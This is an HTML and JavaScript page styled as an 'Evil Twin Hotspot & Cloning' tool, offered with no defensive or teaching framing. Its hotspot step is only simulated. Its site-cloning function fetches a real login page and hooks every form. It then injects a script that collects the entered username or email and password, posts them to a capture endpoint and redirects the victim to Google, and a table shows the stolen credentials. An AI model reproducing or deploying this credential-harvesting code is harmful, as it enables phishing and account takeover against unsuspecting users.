<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evil Twin Hotspot & Cloning Simulator</title>
    <style>
        body {
            font-family: monospace;
            margin: 0;
            padding: 20px;
            background: #1a1a1a;
            color: #0f0;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #222;
            padding: 20px;
            border: 2px solid #0f0;
        }
        input, button {
            padding: 10px;
            margin: 5px;
            border: 1px solid #0f0;
            background: #333;
            color: #0f0;
            border-radius: 0;
        }
        button:hover {
            background: #0f0;
            color: #000;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            border: 1px solid #0f0;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #0f0;
            color: #000;
        }
        .status {
            margin: 10px 0;
            padding: 10px;
            background: #333;
            border: 1px solid #0f0;
        }
        .error {
            color: #f00;
        }
        #clonedContent {
            margin-top: 20px;
            border: 1px solid #0f0;
            padding: 10px;
            display: none;
            background: #111;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Evil Twin Hotspot & Cloning</h2>
        <div id="status" class="status">Status: Awaiting Command</div>
        <div id="error" class="error"></div>
        
        <h3>Deploy Open Hotspot</h3>
        <input type="text" id="ssid" placeholder="SSID (e.g., FreeWiFi)">
        <button onclick="deployHotspot()">Deploy Free Hotspot</button>
        
        <h3>Clone Target Site</h3>
        <input type="url" id="urlInput" placeholder="Target URL (http://...)">
        <button onclick="cloneSite()">Clone Site</button>
        <button onclick="viewCloned()">Inspect Cloned Site</button>
        
        <h3>Captured Data</h3>
        <table>
            <thead>
                <tr>
                    <th>User</th>
                    <th>Pass</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody id="credTable"></tbody>
        </table>
        
        <div id="clonedContent"></div>
    </div>

    <script>
        let credentials = [];
        let clonedData = '';

        function updateStatus(msg, isError = false) {
            document.getElementById('status').innerText = 'Status: ' + msg;
            document.getElementById('status').style.background = isError ? '#f00' : '#333';
            document.getElementById('error').innerText = isError ? msg : '';
        }

        async function deployHotspot() {
            const ssid = document.getElementById('ssid').value;
            if (!ssid) {
                updateStatus('SSID required', true);
                return;
            }

            // Simulate open hotspot creation with beacon frame injection (no password)
            const beaconFrame = btoa(`SSID:${ssid},ENC:NONE`);
            localStorage.setItem('hotspot', beaconFrame);
            updateStatus(`Open hotspot "${ssid}" deployed (beacon frame simulated)`);
        }

        async function cloneSite() {
            const url = document.getElementById('urlInput').value;
            if (!url.match(/^http(s)?:\/\//)) {
                updateStatus('Valid HTTP/HTTPS URL required', true);
                return;
            }

            try {
                const response = await fetch(url, {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,*/*',
                        'Accept-Language': 'en-US,en;q=0.5'
                    }
                });
                let html = await response.text();

                // Strip tracking and external scripts
                html = html.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, 
                    match => match.includes('ad') || match.includes('track') ? '' : match);

                // Rewrite relative URLs
                html = html.replace(/(src|href)=("|')([^"']+)("|')/gi, (match, attr, quote, value) => {
                    if (!value.match(/^http(s)?:\/\//)) {
                        return `${attr}=${quote}/spoofed/${value}${quote}`;
                    }
                    return match;
                });

                // Intercept form submissions
                html = html.replace(/<form/gi, '<form onsubmit="return captureForm(this)"');

                // Inject credential capture script
                const captureScript = `
                    <script>
                        function captureForm(form) {
                            const email = form.querySelector('input[type="email"], input[name="username"], input[name="login"]')?.value || '';
                            const password = form.querySelector('input[type="password"]')?.value || '';
                            fetch('/capture', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({email, password, time: new Date().toISOString()})
                            }).then(() => window.location.href = 'https://www.google.com');
                            return false;
                        }
                    </script>`;
                
                html = html.replace('</head>', captureScript + '</head>');
                clonedData = html;
                updateStatus('Site cloned and rigged');
            } catch (error) {
                updateStatus('Clone failed: ' + error.message, true);
            }
        }

        function captureCredentials(email, password, timestamp) {
            credentials.push({ email, password: btoa(password), timestamp });
            updateCredentialsTable();
        }

        function updateCredentialsTable() {
            const tableBody = document.getElementById('credTable');
            tableBody.innerHTML = credentials.map(cred => `
                <tr>
                    <td>${cred.email}</td>
                    <td>${atob(cred.password)}</td>
                    <td>${cred.timestamp}</td>
                </tr>
            `).join('');
        }

        function viewCloned() {
            if (clonedData) {
                const clonedContent = document.getElementById('clonedContent');
                clonedContent.innerHTML = clonedData;
                clonedContent.style.display = 'block';
            } else {
                updateStatus('No site cloned', true);
            }
        }

        // Simulate server-side capture endpoint
        window.addEventListener('message', (event) => {
            if (event.data.email && event.data.password) {
                captureCredentials(event.data.email, event.data.password, event.data.time);
            }
        });
    </script>
</body>
</html>
